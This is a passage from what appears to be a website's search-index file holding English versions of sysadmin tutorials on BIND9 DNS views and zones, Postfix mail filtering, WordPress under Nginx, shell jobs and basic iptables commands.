\"rndc-key\"; }; }; named.conf.default-zones linkIdeally, build a zone/view file (to include in named.conf for each of your zones). But for simplicity, we’ll leave everything in the same file here.\nThe view sections define server behaviors based on the IP address of the client sending the request, allowing DNS responses to be differentiated. We define two views:\nOne corresponding to clients in the internal and DMZ zone: recursion needs to be re-enabled for these requests, and resolving all possible names (zone “.”) needs to be allowed. Another corresponding to requests from outside (e.g. Internet). Only authorize requests for the zone where the DNS server has authority: view \"interne\" { // These are the clients that see this view match-clients { zoneinterne; }; // Recursion permited for zoneinterne ACL subnets recursion yes; allow-recursion { zoneinterne; }; // prime the server with knowledge of the root servers zone \".\" { type hint; file \"/etc/bind/db.root\"; }; // be authoritative for the localhost forward and reverse zones, and for // broadcast zones as per RFC 1912 zone \"deimos.fr\" { type master; notify no; allow-update { none; }; file \"/etc/bind/db.deimos.fr.local\"; }; zone \"mavro.fr\" { type master; notify no; allow-update { none; }; file \"/etc/bind/db.mavro.fr.local\"; }; zone \"localhost\" { type master; notify no; allow-update { none; }; file \"/etc/bind/db.local\"; }; zone \"127.in-addr.arpa\" { type master; notify no; allow-update { none; }; file \"/etc/bind/db.127\"; }; zone \"0.in-addr.arpa\" { type master; notify no; allow-update { none; }; file \"/etc/bind/db.0\"; }; zone \"255.in-addr.arpa\" { type master; notify no; allow-update { none; }; file \"/etc/bind/db.255\"; }; zone \"0.168.192.in-addr.arpa\" { type master; notify no; allow-update { none; }; file \"/etc/bind/db.0.168.192.inv.local\"; }; }; Now let’s move on to our external zone which will be visible to everyone from outside:\nview \"externe\" { match-clients { any; }; // Recursion not permited for World Wide Web recursion no; zone \"deimos.fr\" { type master; notify yes; allow-update { none; }; allow-transfer { \"rndc-key\"; }; file \"/etc/bind/db.deimos.fr\"; }; zone \"mavro.fr\" { type master; notify yes; allow-update { none; }; allow-transfer { \"rndc-key\"; }; file \"/etc/bind/db.mavro.fr\"; }; zone \"localhost\" { type master; notify yes; allow-update { none; }; file \"/etc/bind/db.local\"; }; zone \"127.in-addr.arpa\" { type master; notify yes; allow-update { none; }; file \"/etc/bind/db.127\"; }; zone \"0.in-addr.arpa\" { type master; notify yes; allow-update { none; }; file \"/etc/bind/db.0\"; }; zone \"255.in-addr.arpa\" { type master; notify yes; allow-update { none; }; file \"/etc/bind/db.255\"; }; zone \"0.168.192.in-addr.arpa\" { type master; notify yes; allow-update { none; }; allow-transfer { \"rndc-key\"; }; file \"/etc/bind/db.0.168.192.inv\"; }; }; named.conf.options linkHere’s the content:\noptions { directory \"/var/cache/bind\"; // If there is a firewall between you and nameservers you want // to talk to, you may need to fix the firewall to allow multiple // ports to talk. See http://www.kb.cert.org/vuls/id/800113 // If your ISP provided one or more IP addresses for stable // nameservers, you probably want to use them as forwarders. // Uncomment the following block, and insert the addresses replacing // the all-0's placeholder. // Force other DNS to answer //forwarders { // 212.27.32.176; // 212.27.32.177; //}; //======================================================================== // If BIND logs error messages about the root key being expired, // you will need to update your keys. See https://www.isc.org/bind-keys //======================================================================== // Avoid Bind Cache Poisoning dnssec-enable yes; dnssec-validation auto; allow-query { any; }; // Security version // Check with: dig -t txt -c chaos VERSION.BIND @ version \"Microsoft 2008 DNS Server\"; auth-nxdomain no; # conform to RFC1035 listen-on-v6 { any; }; }; You can add these types of options to improve security:\nallow-recursion { none; }; // disabling recursive queries (and thus DNS cache Poisoning) allow-transfer { none; }; // disabling zone transfer notify no; // disabling zone change notifications zone-statistics no; // disabling statistics interface-interval 0; // disabling search for new interfaces max-cache-size 20M; // max cache size In case you want to redirect domains (e.g., google.com –\u003e a machine on your local network):\nzone \"google.com\" { type forward; forwarders { 192.168.0.17; // My primary DNS 192.168.0.30; // My secondary DNS }; forward only; }; You can also add this:\nzone \"128.168.192.in-addr.arpa\" { type forward; forwarders { 192.168.128.99; }; forward only; }; db.deimos.fr linkHere is the content of my file that will be available to everyone:\n$TTL 604800 @ IN SOA simba.deimos.fr. root.deimos.fr. ( Replace the first field with the FQDN of your machine, and the second corresponds to the admin’s email (here root@deimos.fr). The email address is written in a special way, but it works.\n2010301201 ; Serial (date + incrementation) Note: By convention, the serial is in the form YYYYMMDDNN (YYYY: year, MM: month, DD: day, NN: revision).\n7200 ; Refresh 3600 ; Retry 1209600 ; Expire 604800 ; Negative Cache TTL ) NS mufasa.deimos.fr. A 88.162.130.192 NS ns6.gandi.net. NS shenzi.deimos.fr. MX 5 mufasa.deimos.fr. MX 10 shenzi.deimos.fr. TXT \"v=spf1 ip4:192.168.0.0/24 a mx ~all exp=getlost.deimos.fr\" getlost TXT \"You are not allowed to send a message from this domain\" _deimos.fr TXT \"t=y; o=-;\" m1._deimos.fr TXT \"g=; k=rsa; p=;...IWWiAyklt5FDmS2U7QIDAQAB...\" For the TXT part, I’ll let you check out other articles that deal with SPF.\nlocalhost A 127.0.0.1 mufasa A 82.232.191.145 shenzi A 88.191.130.125 ns6 A 217.70.177.40 mail CNAME mufasa jabber CNAME mufasa server CNAME mufasa serveur CNAME mufasa sftp CNAME mufasa www CNAME mufasa blocnotesinfo CNAME mufasa infos CNAME mufasa webmail CNAME mufasa nagios CNAME mufasa All of these correspond to your A records, canonical names, etc.\ndb.deimos.fr.local linkThis is for the internal zone, put whatever you want without restrictions…\n$TTL 604800 @ IN SOA simba.deimos.fr. root.deimos.fr. ( 2010301201 ; Serial (date + incrementation) 7200 ; Refresh 3600 ; Retry 1209600 ; Expire 604800 ; Negative Cache TTL ) NS simba.deimos.fr. A 192.168.110.3 MX 5 mufasa.deimos.fr. MX 10 shenzi.deimos.fr. localhost A 127.0.0.1 mufasa A 192.168.0.254 shenzi A 192.168.20.4 ns6 A 217.70.177.40 rafiki A 192.168.110.1 simba A 192.168.110.3 sarabi A 192.168.99.10 www CNAME rafiki www1 CNAME rafiki www2 CNAME shenzi blocnotesinfo CNAME www blog CNAME www webmail CNAME www nagios CNAME www git CNAME www gitweb CNAME www phpmyadmin CNAME www backuppc CNAME sarabi db.0.168.192.inv linkIf now we want reverse DNS:\n$TTL 604800 @ IN SOA simba.deimos.fr. root.deimos.fr. ( 2010301201 ; Serial (date + incrementation) 7200 ; Refresh 3600 ; Retry 1209600 ; Expire 604800 ; Negative Cache TTL ) NS simba.deimos.fr. A 88.162.130.192 A 88.191.31.89 NS ns6.gandi.net. NS shenzi.deimos.fr. MX 5 simba.deimos.fr. MX 10 shenzi.deimos.fr. TXT \"v=spf1 ip4:192.168.0.0/24 a mx ~all exp=getlost.deimos.fr\" getlost TXT \"You are not allowed to send a message from this domain\" 1 PTR localhost 2 PTR simba 3 PTR ns6.gandi.net 4 PTR shenzi.deimos.fr The PTRs should go from smallest to largest based on priorities.\ndb.0.168.192.inv.local linkNow, the reverse DNS for local:\n$TTL 604800 @ IN SOA simba.deimos.fr. root.deimos.fr. ( 2010301201 ; Serial (date + incrementation) 3600 ; Refresh 7200 ; Retry 1209600 ; Expire 604800 ; Negative Cache TTL ) NS simba.deimos.fr. MX 5 simba.deimos.fr. 1 PTR localhost 2 PTR simba 3 PTR serveur 4 PTR earth 5 PTR wind 6 PTR water 10 PTR kiss 11 PTR imprimante 30 PTR psp 31 PTR pocket 32 PTR ldap Verification linkAll that’s left is to restart the service and check the logs:\n/etc/init.d/bind9 restart $ tail -100 /var/log/syslog Jun 10 22:44:20 deimos named[9641]: starting BIND 9.4.1 -u bind Jun 10 22:44:20 deimos named[9641]: found 2 CPUs, using 2 worker threads Jun 10 22:44:20 deimos named[9641]: loading configuration from '/etc/bind/named.conf' Jun 10 22:44:20 deimos named[9641]: no IPv6 interfaces found Jun 10 22:44:20 deimos named[9641]: listening on IPv4 interface eth0, 192.168.0.1#53 Jun 10 22:44:20 deimos named[9641]: listening on IPv4 interface lo, 127.0.0.1#53 Jun 10 22:44:20 deimos named[9641]: listening on IPv4 interface tun0, 10.8.0.1#53 Jun 10 22:44:20 deimos named[9641]: listening on IPv4 interface bond0, 192.168.0.2#53 Jun 10 22:44:20 deimos named[9641]: automatic empty zone: view interne: 254.169.IN-ADDR.ARPA Jun 10 22:44:20 deimos named[9641]: automatic empty zone: view interne: 2.0.192.IN-ADDR.ARPA Jun 10 22:44:20 deimos named[9641]: automatic empty zone: view interne: 255.255.255.255.IN-ADDR.ARPA Jun 10 22:44:20 deimos named[9641]: automatic empty zone: view interne: 0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.IP6.ARPA Jun 10 22:44:20 deimos named[9641]: automatic empty zone: view interne: 1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.IP6.ARPA Jun 10 22:44:20 deimos named[9641]: automatic empty zone: view interne: D.F.IP6.ARPA Jun 10 22:44:20 deimos named[9641]: automatic empty zone: view interne: 8.E.F.IP6.ARPA Jun 10 22:44:20 deimos named[9641]: automatic empty zone: view interne: 9.E.F.IP6.ARPA Jun 10 22:44:20 deimos named[9641]: automatic empty zone: view interne: A.E.F.IP6.ARPA Jun 10 22:44:20 deimos named[9641]: automatic empty zone: view interne: B.E.F.IP6.ARPA Jun 10 22:44:20 deimos named[9641]: command channel listening on 127.0.0.1#953 Jun 10 22:44:20 deimos named[9641]: zone 0.in-addr.arpa/IN/interne: loaded serial 1 Jun 10 22:44:20 deimos named[9641]: zone 127.in-addr.arpa/IN/interne: loaded serial 1 Jun 10 22:44:20 deimos named[9641]: zone 0.168.192.in-addr.arpa/IN/interne: loaded serial 2006031801 Jun 10 22:44:20 deimos named[9641]: zone 255.in-addr.arpa/IN/interne: loaded serial 1 Jun 10 22:44:20 deimos named[9641]: zone mavro.fr/IN/interne: loaded serial 2006031801 Jun 10 22:44:20 deimos named[9641]: zone localhost/IN/interne: loaded serial 1 Jun 10 22:44:20 deimos named[9641]: zone deimos.fr/IN/interne: loaded serial 2006110401 Jun 10 22:44:20 deimos named[9641]: zone 0.in-addr.arpa/IN/externe: loaded serial 1 Jun 10 22:44:20 deimos named[9641]: zone 127.in-addr.arpa/IN/externe: loaded serial 1 Jun 10 22:44:20 deimos named[9641]: zone 0.168.192.in-addr.arpa/IN/externe: loaded serial 2006102701 Jun 10 22:44:20 deimos named[9641]: zone 255.in-addr.arpa/IN/externe: loaded serial 1 Jun 10 22:44:21 deimos named[9641]: zone mavro.fr/IN/externe: loaded serial 2007040103 Jun 10 22:44:21 deimos named[9641]: zone localhost/IN/externe: loaded serial 1 Jun 10 22:44:21 deimos named[9641]: zone deimos.fr/IN/externe: loaded serial 2007040101 Jun 10 22:44:21 deimos named[9641]: running No errors here, so everything is good :-)\nFAQ linkWhat folders and permissions for Bind’s chroot? linkHere are the commands to execute:\nmkdir -p /var/lib/named/etc mkdir /var/lib/named/dev mkdir -p /var/lib/named/var/cache/bind mkdir -p /var/lib/named/var/run/bind/run mv /etc/bind /var/lib/named/etc ln -s /var/lib/named/etc/bind /etc/bind mknod /var/lib/named/dev/null c 1 3 mknod /var/lib/named/dev/random c 1 8 chmod 666 /var/lib/named/dev/null /var/lib/named/dev/random chown -R bind:bind /var/lib/named/var/* chown -R bind:bind /var/lib/named/etc/bind named: invalid command from 127.0.0.1: bad auth linkHow is it that all my conf files contain the same RNDC key, and yet I get this type of error?\nThe reason is simple: Bind must already be running. So a quick check with:\nnetstat -auntp And there we should realize that it’s already running. So kill the corresponding PIDs and restart the Bind service:\npkill named Why can’t I make records with “_”? linkBind versions from 9.3 now incorporate more precise control over domain name validity. They can no longer contain _ (0x5f in the ASCII table), as stipulated by RFC 1035. This is however quite unfortunate for me because I have several domains containing _.\nError message produced:\nMar 6 07:48:08 dns3 named[25459]: pri/rags.ch.hosts:25: wisteria_lane.rags.ch: bad owner name (check-names) Mar 6 07:48:08 dns3 named[25459]: zone rags.ch/IN: loading master file pri/rags.ch.hosts: bad owner name (check-names) Here’s a small patch that solves the problem:\nname_with_underscore.patch: --- lib/dns/name.c.orig 2006-03-06 17:44:30.000000000 +0100 +++ lib/dns/name.c 2006-03-06 17:45:07.000000000 +0100 @@ -261,7 +261,7 @@ return (ISC_FALSE); } -#define hyphenchar(c) ((c) == 0x2d) +#define hyphenchar(c) ((c) == 0x2d || (c) == 0x5f) #define asterchar(c) ((c) == 0x2a) #define alphachar(c) (((c) \u003e= 0x41 \u0026\u0026 (c) \u003c= 0x5a) \\ || ((c) \u003e= 0x61 \u0026\u0026 (c) \u003c= 0x7a)) zone ‘deimos.fr’ allows updates by IP address, which is insecure linkYou may have log errors like this:\nOct 2 17:29:03 star1 named[5120]: zone 'deimos.fr' allows updates by IP address, which is insecure This simply means that your RNDC key is not being used. To use it with ACLs, just add your secondary servers to the “controls” section and only allow updates (at zone level) with the RNDC key:\n... controls { inet 127.0.0.1 port 953 allow { 127.0.0.1; secondaryinternaldns; } keys { \"rndc-key\"; }; }; ... zone \"deimos.fr\" { type master; notify yes; allow-update { key \"rndc-key\"; }; file \"/etc/bind/db.deimos.fr\"; }; ... Now restart your DNS server and there are no more problems, exchanges are encrypted :-)\ntoo many timeouts resolving ‘mycompany.com/MX’ (in ’eu’?): disabling EDNS linkThis error can appear for name resolution that takes too long due to UDP packet size. This can be very annoying, especially for email reception which can take a few hours. The solution is to add this line:\n... edns-udp-size 1460; ... Then restart the bind service. If the problem persists, try lowering the size (change from 1460 to 500 for example). There are ways to test all this using the dig command.\nUse it like this until you no longer have timeouts:\ndig +norec +dnssec mycompany.com MX @my_dns_server dig +dnssec +norec +ignore dnskey MX @my_dns_server zone deimos.fr/IN/internalview: journal rollforward failed: journal out of sync with zone linkThe server might have been shut down abruptly, or the zone file was manually edited without the zone being frozen. To solve this problem:\nStop the bind server Delete the journal files (*.jnl in “/etc/bind”) Restart the bind server How do I clear my cache? linkTo clear your bind cache:\nrndc flush Resources linkDNS Server on OpenBSD\nInstalling An Ubuntu DNS Server With BIND\nhttp://fr.wikipedia.org/wiki/BIND\nhttp://fr.gentoo-wiki.com/HOWTO_Bind\nhttp://www.zytrax.com/books/dns/\nhttp://brocas.org/blog/post/2006/06/22/14-de-la-securite-d-une-architecture-dns-d-entreprise\nhttp://groups.google.com/group/comp.protocols.dns.bind/browse_thread/thread/cfa8c63ec6bd08d6?pli=1\n"
            }
        );
    index.add(
            {
                id:  247 ,
                href: "\/Installation_et_configuration_de_Postfix_et_Courrier\/",
                title: "Installation and Configuration of Postfix and Courier",
                description: "A comprehensive guide on installing and configuring Postfix mail server with Courier on various operating systems including Debian, OpenBSD, and FreeBSD.",
                content: " Introduction linkPostfix is an email server and free software developed by Wietse Venema. It handles the delivery of electronic messages. It was designed as a faster, easier to administer, and more secure alternative to the historical Sendmail.\nThis software can handle almost all cases of professional use. Used with regexp in a junk file and a public anti-spam list, it prevents many spams without even having to scan message contents. It ideally replaces all kinds of less free solutions. You can find some how-tos on the official Postfix site. To optimize email analysis, Postfix allows delegating email management to an external process, which will determine whether the email is accepted or rejected (very useful in anti-spam systems).\nThe following diagram describes the internal architecture of postfix:\nInstallation linkDebian linkTo install a Postfix server, here is the minimum to install:\napt-get install postfix courier-imap-ssl procmail spamc OpenBSD linkOn OpenBSD, we’ll use the simple packaged version:\npkg_add -iv postfix After installation, you need to replace postfix in place of sendmail. Just follow the instructions given at the end of the Postfix installation. In particular, you need to delete the sendmail cron tasks and configure the system to use postfix instead of Sendmail.\nThis is what the postfix_enable script does!\nFreeBSD linkOn FreeBSD, we’ll use the packaged version:\npkg_add -vr postfix After installation, you need to replace postfix in place of sendmail. Just follow the instructions given at the end of the Postfix installation. We’ll continue here by adding this line in rc.conf:\n... postfix_enable=\"YES\" Let’s disable sendmail by adding these lines:\nsendmail_enable=\"NO\" sendmail_submit_enable=\"NO\" sendmail_outbound_enable=\"NO\" sendmail_msp_queue_enable=\"NO\" Configuration linkFor the configuration, you will need to edit and adapt the configuration file:\n# See /usr/share/postfix/main.cf.dist for a commented, more complete version # Security smtpd_banner = fire.deimos.fr - Microsoft Exchange (5.5) biff = no disable_vrfy_command = yes smtpd_helo_required = yes # Reject unknow domain reject_unknown_recipient_domain = yes # appending .domain is the MUA's job. append_dot_mydomain = no # Uncomment the next line to generate \"delayed mail\" warnings #delay_warning_time = 4h myhostname = fire.deimos.fr alias_maps = hash:/etc/aliases alias_database = hash:/etc/aliases.db myorigin = /etc/mailname mydestination = deimos.fr, fire, localhost relayhost = mynetworks = 127.0.0.0/8, 192.168.0.0/24, 10.8.0.0 home_mailbox = Maildir/ mailbox_size_limit = 0 recipient_delimiter = + inet_interfaces = all mailbox_command = procmail -a \"$EXTENSION\" # Masquerade_domains hides hostnames from addresses masquerade_domains = deimos.fr # Virtual Domains # virtual_alias_domains = mavrocordato.com mavro.fr deimos.servehttp.com # virtual_alias_maps = hash:/etc/postfix/virtual # Protection against Open Relay smtpd_client_restrictions = reject_rbl_client bl.spamcop.net # Protection against Spam smtpd_recipient_restrictions = permit_sasl_authenticated, permit_mynetworks, reject_unauth_destination, reject_invalid_hostname, reject_non_fqdn_sender, reject_unknown_sender_domain, reject_non_fqdn_recipient, reject_unknown_recipient_domain, reject_rhsbl_client blackhole.securitysage.com, reject_rhsbl_sender blackhole.securitysage.com, reject_rbl_client relays.ordb.org, reject_rbl_client opm.blitzed.org, reject_rbl_client list.dsbl.org, reject_rbl_client cbl.abuseat.org, reject_rbl_client dul.dnsbl.sorbs.net, permit smtpd_data_restrictions = reject_unauth_pipelining mime_header_checks = regexp:/etc/postfix/mime_header_checks.regexp # Use Amavis content_filter = amavis:[127.0.0.1]:10024 receive_override_options = no_address_mappings As you can see, the “smtpd_recipient_restrictions” line is quite long. This is because RBLs are integrated into it. Here is a short description:\nRBLs aim to provide a list of servers known as major email senders and to list major spammers. It is actually a large generalized blacklist. The principle of use is very simple: when a filter receives an email, it checks if the sending server is contained in an RBL. If so, the email is categorized as spam. The RBLs that a filter uses as sources of servers are usually determined by the system administrator. This method therefore contains its share of controversy, as some RBLs are known to be more effective than others. The choice of RBLs therefore directly influences the effectiveness of the anti-spam system. In addition, some RBLs have looser rules than others regarding adding a server to their list, further complicating the situation. Among the known RBLs, note, among others, SpamHaus, DynaBlock, Sorbs, and DSBL. It is also possible to associate ROKSO with RBLs. ROKSO (Register of Known Spam Operations) is a list of the most active spammers. In fact, ROKSO members are responsible for nearly 80% of spam on the Net.\nThe “disable_dns_lookups = yes” option is used to disable DNS requests. When the “relayhost” is between “[ ]”, it implies that postfix will not try to resolve the MX.\nThen create a file /etc/postfix/mime_header_checks.regexp:\n/filename=\\\\\"?(.*)\\.(bat|chm|cmd|com|cpl|do|exe|hta|jse|rm|scr|pif|vbe|vbs|vxd|xl)\\\\\"?$/ REJECT For security reasons attachments of this type are rejected. /^\\s*Content-(Disposition|Type).*name\\s*=\\s*\"?(.+\\.(lnk|cpl|asd|hlp|ocx|reg|bat|c[ho]m|cmd|exe|dll|vxd|pif|scr|hta|jse?|sh[mbs]|vb[esx]|ws[fh]|wav|mov|wmf|xl)) \"?\\s*$/ REJECT Attachment type not allowed. File \"$2\" has the unacceptable extension \"$3\" If certain attachments do not pass when sending or receiving, this is where you need to make changes (at the level of extensions).\nEdit the /etc/mailname file and put your DNS:\ndeimos.fr OpenBSD linkFor OpenBSD, there are these additional lines:\nmail_owner = _postfix inet_protocols = all unknown_local_recipient_reject_code = 550 debug_peer_level = 2 debugger_command = PATH=/bin:/usr/bin:/usr/local/bin:/usr/X11R6/bin xxgdb $daemon_directory/$process_name $process_id \u0026 sleep 5 sendmail_path = /usr/local/sbin/sendmail newaliases_path = /usr/local/sbin/newaliases mailq_path = /usr/local/sbin/mailq setgid_group = _postdrop html_directory = /usr/local/share/doc/postfix/html manpage_directory = /usr/local/man sample_directory = /etc/postfix readme_directory = /usr/local/share/doc/postfix/readme Edit the /etc/mailname file and put your DNS:\ndeimos.fr Launch Postfix linkDebian linkOnce all this is done, you just have to run the service restart command:\n/etc/init.d/postfix restart OpenBSD linkPostfix starts with the postfix start command, but first you need to enable Postfix instead of Sendmail:\npostfix-enable Check the /var/log/messages and /var/log/maillog files to see if everything went well.\nStopping and starting Postfix, checking the configuration:\npostfix check: basic configuration check postfix reload: reload configuration files postfix start: start postfix postfix stop: stop postfix Queue management:\nmailq: display queue content postqueue -p: display queue content postqueue -f: force queue processing postfix flush: force queue processing FreeBSD linkWe will kill sendmail and start postfix:\npkill sendmail postfix start Postfix is now started.\nCreating mailboxes linkTo create a mailbox, simply go to your home directory and type:\nmaildirmake Maildir Then, for emails to reach their destination, you must place these few lines in a “.procmailrc” file:\nVERBOSE=ON DROPPRIVS=YES SHELL=/bin/sh PATH=/usr/local/bin:/usr/bin:/bin MAILDIR=$HOME/Maildir/ DEFAULT=$MAILDIR/new LOGFILE=/var/log/procmail.log :0fw * \u003c 256000 | /usr/bin/spamc -f :0e { EXITCODE=$? } Protecting even more against spam linkI recommend a site that lists all interesting addresses. Make good use of it, but be careful not to put too many!\nhttp://spamlinks.net/filter-dnsbl-lists.htm\nResources link Official Postfix Website Documentation on setting up Postfix on OpenBSD Postscreen: fight a little more against spam Quick installation of a secure mail server Advanced Postfix Configuration Fighting spam with Postfix SMTP Server Mail Routing with Postfix Antispam Practices SMTP reject 554: Eliminate spam at the root Documentation on configuring bounce mail on Postfix Adaptive and efficient anti-spam with OpenBSD and Spamd Virtual Users And Domains With Postfix Courier MySQL And SquirrelMail How To Whitelist Hosts IP Addresses In Postfix Installing a mail server brick by brick "
            }
        );
    index.add(
            {
                id:  248 ,
                href: "\/Utilisation_avanc%C3%A9e_de_Wordpress\/",
                title: "Advanced WordPress Usage",
                description: "Tips and techniques for advanced WordPress configuration, including Nginx setup, JavaScript integration, and file handling.",
                content: "Introduction linkWordPress is great, but it also has limitations that can quickly become annoying. There are ways to overcome these limitations, which I’m going to explain here.\nNginx Configuration linkFor WordPress configuration under Nginx, here’s an example:\nserver { include listen_port.conf; listen 443 ssl; ssl_certificate /etc/nginx/ssl/deimos.fr/server-unified.crt; ssl_certificate_key /etc/nginx/ssl/deimos.fr/server.key; ssl_session_timeout 5m; server_name blog.deimos.fr; root /usr/share/nginx/www/deimos.fr/blog; index index.php; access_log /var/log/nginx/blog.deimos.fr_access.log; error_log /var/log/nginx/blog.deimos.fr_error.log; location / { try_files $uri $uri/ /index.php?$args; } location ~ \\.php$ { fastcgi_cache mycache; fastcgi_cache_key $request_method$host$request_uri; fastcgi_cache_valid any 1h; include fastcgi_params; fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_intercept_errors on; } # Drop config include drop.conf; # BEGIN W3TC Browser Cache gzip on; gzip_types text/css application/x-javascript text/x-component text/richtext image/svg+xml text/plain text/xsd text/xsl text/xml image/x-icon; location ~ \\.(css|js|htc)$ { expires 31536000s; add_header Pragma \"public\"; add_header Cache-Control \"public, must-revalidate, proxy-revalidate\"; add_header X-Powered-By \"W3 Total Cache/0.9.2.4\"; } location ~ \\.(html|htm|rtf|rtx|svg|svgz|txt|xsd|xsl|xml)$ { expires 3600s; add_header Pragma \"public\"; add_header Cache-Control \"public, must-revalidate, proxy-revalidate\"; add_header X-Powered-By \"W3 Total Cache/0.9.2.4\"; } location ~ \\.(asf|asx|wax|wmv|wmx|avi|bmp|class|divx|doc|docx|eot|exe|gif|gz|gzip|ico|jpg|jpeg|jpe|mdb|mid|midi|mov|qt|mp3|m4a|mp4|m4v|mpeg|mpg|mpe|mpp|otf|odb|odc|odf|odg|odp|ods|odt|ogg|pdf|png|pot|pps|ppt|pptx|ra|ram|svg|svgz|swf|tar|tif|tiff|ttf|ttc|wav|wma|wri|xla|xls|xlsx|xlt|xlw|zip)$ { expires 31536000s; add_header Pragma \"public\"; add_header Cache-Control \"public, must-revalidate, proxy-revalidate\"; add_header X-Powered-By \"W3 Total Cache/0.9.2.4\"; } # END W3TC Browser Cache # BEGIN W3TC Minify core rewrite ^/wp-content/w3tc/min/w3tc_rewrite_test$ /wp-content/w3tc/min/index.php?w3tc_rewrite_test=1 last; rewrite ^/wp-content/w3tc/min/(.+\\.(css|js))$ /wp-content/w3tc/min/index.php?file=$1 last; # END W3TC Minify core } } Using JavaScript in a Post linkI want to use JavaScript here to prevent my email address from being captured by spam robots. We first need to insert this in a post:\nSo the full anti-spam system looks like:\nEmail address protected by JavaScript. Please enable JavaScript to contact me. Adding Unsupported Extensions linkFor example, I want to enable the OGV format for my blog. I’ll need to modify the file wp-includes/functions.php and add these lines:\n... function wp_ext2type( $ext ) { $ext2type = apply_filters('ext2type', array( 'audio' =\u003e array('aac','ac3','aif','aiff','mp1','mp2','mp3','m3a','m4a','m4b','ogg','ram','wav','wma'), 'video' =\u003e array('asf','avi','divx','dv','mov','mpg','mpeg','mp4','mpv','ogm','qt','rm','vob','wmv', 'm4v','ogv'), 'document' =\u003e array('doc','docx','pages','odt','rtf','pdf'), ... if ( !$mimes ) { // Accepted MIME types are set here as PCRE unless provided. $mimes = apply_filters( 'upload_mimes', array( 'jpg|jpeg|jpe' =\u003e 'image/jpeg', 'gif' =\u003e 'image/gif', 'png' =\u003e 'image/png', 'bmp' =\u003e 'image/bmp', 'tif|tiff' =\u003e 'image/tiff', 'ico' =\u003e 'image/x-icon', 'asf|asx|wax|wmv|wmx' =\u003e 'video/asf', 'avi' =\u003e 'video/avi', 'divx' =\u003e 'video/divx', 'flv' =\u003e 'video/x-flv', 'ogv' =\u003e 'video/ogg', 'mov|qt' =\u003e 'video/quicktime', ... There are two places to modify: the wp_ext2type function and the get_allowed_mime_types function.\nAutomatically Delete Comments from Trash linkIt’s possible to automatically delete comments in the trash after a specified number of days. Edit your WordPress configuration and add this:\n[...] /* Empty the trash */ define('EMPTY_TRASH_DAYS', 2 ); [...] Here, I’ve indicated that I want the trash to empty itself every 2 days.\nFAQ linkFailed to write file to disk linkI had this small problem when I tried to upload files that were too large. Here are the different solutions to fix the problem:\nCheck the owner permissions and write access on the upload folder Look in the file /etc/php5/cgi/php.ini and adjust the size that suits you: post_max_size = 50M upload_max_filesize = 50M Check the size of /tmp on your server (for example, my vservers are by default set to 16M, which was problematic since it’s the temporary location where WordPress stores its files) Resources linkhttp://codex.wordpress.org/Using_Javascript\n"
            }
        );
    index.add(
            {
                id:  249 ,
                href: "\/Simulate_a_black_hole_for_a_domain_with_Postfix\/",
                title: "Simulate a black hole for a domain with Postfix",
                description: "How to set up a black hole for emails in Postfix to test outgoing mail services.",
                content: " Software version 2.10 Operating System Debian 7 Website Postfix Website Last Update 07/05/2013 Introduction linkWhen you manage outgoing emails through SMTP, you may sometimes need to test if a service is able to send correctly emails and itself check that there were no issue during sending. You can create a black hole for a specific domain and Postfix will answer from the same manner as if it is ok. It also permits to test Postfix sending capacities on a server.\nInstallation linkOf course you need Postfix:\naptitude install postfix Configuration linkIn the Postfix main configuration, add transport map line (/etc/postfix/main.cf):\n[...] transport_maps = dbm:/etc/postfix/blackhole_map [...] Now add the fake domain to the transport map file (/etc/postfix/blackhole_map):\nblackhole.com discard:silently Let’s generate the map now:\npostmap -c /etc/postfix /etc/postfix/blackhole_map Now restart postfix and you will see in your logs something like this:\npostfix/discard[1435]: [ID 897546 mail.info] 4D847A5B: to=, relay=none, delay=13, delays=13/0/0/0, dsn=2.0.0, status=sent (silently) References linkhttp://www.memoire-partagee.fr/2011/01/smtp-sortant-faire-un-trou-noir-avec-postfix/\n"
            }
        );
    index.add(
            {
                id:  250 ,
                href: "\/Jobs_:_Utilisation_des_jobs\/",
                title: "Jobs: How to Use Jobs",
                description: "Learn how to use Linux jobs functionality to run multiple tasks in parallel without needing multiple shells.",
                content: "Introduction linkJobs allow you to have multiple tasks running in parallel. The advantage is that you don’t need to open multiple shells to launch multiple applications.\nUsage linkThe jobs command allows you to see exactly what is running in the background:\njobs [1] + running tail -f /var/log/syslog Here we can see that there is a tail -f running.\nIf you want to launch a command so that it becomes a job (running in the background), start it like this:\ntail -f /var/log/syslog \u0026 If you forgot the ‘\u0026’ symbol at the end of your command, no worries, there is a way to fix it. Press ‘Ctrl+Z’ (^Z) to pause the current command, then type ‘bg’ which means background.\nYou can check the status of your command with the jobs command. Then, if you want to bring back the command you just put in the background, simply use the fg command which means foreground.\nIf you want to exit your shell, you will lose all your ongoing jobs. To prevent this from happening, you need to launch a nohup like this:\nnohup my_command \u0026 Again, if you’re forgetful and forgot the nohup, there’s a solution. After launching your command, you need to:\nPress Ctrl+Z (^Z) Type: bg Then type: disown This will do the equivalent of the previous command.\nTo kill a job, for example the first one: kill %1 To see what’s happening with background processes:\nlsof -p$! "
            }
        );
    index.add(
            {
                id:  251 ,
                href: "\/Les_commandes_de_bases_d%5C%27Iptables\/",
                title: "Basic IPTables Commands",
                description: "Learn the basic IPTables commands for Linux firewalls - including chain manipulation, rule management, and practical examples.",
                content: "Basic Commands linkThere are several operations you can do with iptables. You start with three default chains INPUT, OUTPUT and FORWARD that you cannot delete. Let’s look at the operations to administer chains:\nCreating a new chain:\niptables -N chain Delete an empty chain:\niptables -X chain Change the default rule for a starting chain:\niptables -P chain status Example:\niptables -P INPUT DROP or\niptables --policy FORWARD DROP List the rules in a chain:\niptables -L chain Remove rules from a chain:\niptables -F chain or\niptables --flush chain Empty rules from another table (e.g., NAT):\niptables --table nat --flush chain Reset the bit and packet counters of a chain:\niptables -Z chain Manipulating Rules in a Chain linkAdd a new rule to the chain:\niptables -A Insert a new rule at a position in the chain:\niptables -I Replace a rule at a position in the chain:\niptables -R Delete a rule at a position in the chain:\niptables -D Delete the first matching rule in a chain:\niptables -D Displaying Your IPTables Configuration linkDisplay the entire filter table:\niptables –L –v Display only the NAT table:\niptables –t nat –L –v Usage Examples linkTo allow packets on the telnet port coming from a local network:\niptables --append INPUT --protocol tcp --destination-port telnet --source 192.168.13.0/24 --jump ACCEPT To ignore other incoming packets on the telnet port:\niptables -A INPUT -p 